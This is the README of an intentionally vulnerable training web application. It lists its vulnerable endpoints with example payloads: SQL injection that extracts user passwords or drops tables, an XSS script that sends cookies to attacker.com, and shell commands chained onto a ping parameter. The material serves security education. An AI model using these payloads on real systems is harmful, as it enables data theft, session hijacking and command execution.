# DVMA - Damn Vulnerable Modern Application

A modern security training platform built with React, Node.js, and MySQL that demonstrates common web application vulnerabilities for educational purposes.

## ⚠️ Security Warning

**THIS APPLICATION IS INTENTIONALLY VULNERABLE AND SHOULD NEVER BE DEPLOYED IN PRODUCTION ENVIRONMENTS.**

The vulnerabilities in this application are designed for security education and training purposes only.

## Features

- **SQL Injection**: Test various SQL injection techniques
- **Cross-Site Scripting (XSS)**: Experiment with XSS payloads
- **Insecure Direct Object Reference (IDOR)**: Explore access control vulnerabilities
- **Command Injection**: Test command execution vulnerabilities
- **Authentication Bypass**: Examine weak authentication mechanisms
- **Secure Examples**: Compare vulnerable vs secure implementations

## Tech Stack

- **Frontend**: React 18, React Router, Axios
- **Backend**: Node.js, Express.js
- **Database**: SQLite (no external database setup required)
- **Security**: bcryptjs, JWT, Helmet, CORS

## Quick Start

### Prerequisites

- Node.js (v14 or higher)
- npm or yarn

### Installation

1. **Clone or download the project**

2. **Install dependencies**
   ```bash
   # Install root dependencies
   npm install

   # Install all dependencies (server + client)
   npm run install-all
   ```

3. **Start the application**
   ```bash
   # Start both server and client concurrently
   npm run dev
   ```

   This will start:
   - Backend server on http://localhost:5000 (using SQLite database)
   - Frontend React app on http://localhost:3000

### Manual Start (Alternative)

```bash
# Terminal 1 - Start backend
cd server
npm install
npm run dev

# Terminal 2 - Start frontend
cd client
npm install
npm start
```

## Default Credentials

The application comes with pre-configured test accounts:

| Username | Password | Role |
|----------|----------|------|
| admin    | admin123 | admin |
| user     | user123  | user |

## Vulnerability Examples

### SQL Injection
- **Endpoint**: `/api/products/search`
- **Payload Examples**:
  - `' OR '1'='1` - Returns all products
  - `' UNION SELECT 1,username,password,4 FROM users-- ` - Extract user data
  - `'; DROP TABLE products-- ` - Dangerous table deletion

### XSS (Cross-Site Scripting)
- **Endpoint**: `/api/messages`
- **Payload Examples**:
  - `<script>alert('XSS')</script>` - Basic alert
  - `<img src='x' onerror='alert("XSS")'>` - Image-based XSS
  - `<script>fetch('http://attacker.com/steal?cookie='+document.cookie)</script>` - Cookie theft

### IDOR (Insecure Direct Object Reference)
- **Endpoint**: `/api/user/:id`
- **Test**: Access different user profiles by changing the ID parameter

### Command Injection
- **Endpoint**: `/api/ping`
- **Payload Examples**:
  - `127.0.0.1; ls -la` - List directory contents
  - `127.0.0.1 && uname -a` - Get system information
  - `127.0.0.1 | ifconfig` - Network interface information

## Security Testing Guidelines

### Safe Testing Environment
- Use a dedicated virtual machine or container
- Isolate the application from your main network
- Never test on production systems
- Use strong, unique passwords for database access

### Responsible Disclosure
If you discover additional vulnerabilities:
1. Document the vulnerability
2. Create a secure mitigation strategy
3. Share findings for educational purposes

## Educational Value

This application helps security professionals and developers:

- Understand common web application vulnerabilities
- Learn how attackers exploit these vulnerabilities
- Practice secure coding techniques
- Develop security testing skills
- Compare vulnerable vs secure implementations

## Project Structure

```
dvma/
├── server/                 # Node.js backend
│   ├── index.js           # Main server file with vulnerable endpoints
│   └── package.json       # Server dependencies
├── client/                # React frontend
│   ├── src/
│   │   ├── components/    # Vulnerability testing components
│   │   ├── App.js         # Main React component
│   │   └── App.css        # Application styles
│   └── public/
├── package.json           # Root package.json with scripts
├── database-setup.md      # Database configuration guide
└── README.md             # This file
```

## Contributing

This is an educational project. Contributions that improve the educational value or add new vulnerability examples are welcome.

## License

This project is for educational purposes. Use responsibly and only in controlled environments.

## Disclaimer

The developers of this application are not responsible for any misuse of the information or code provided. This application is intended for legal security research and education only.
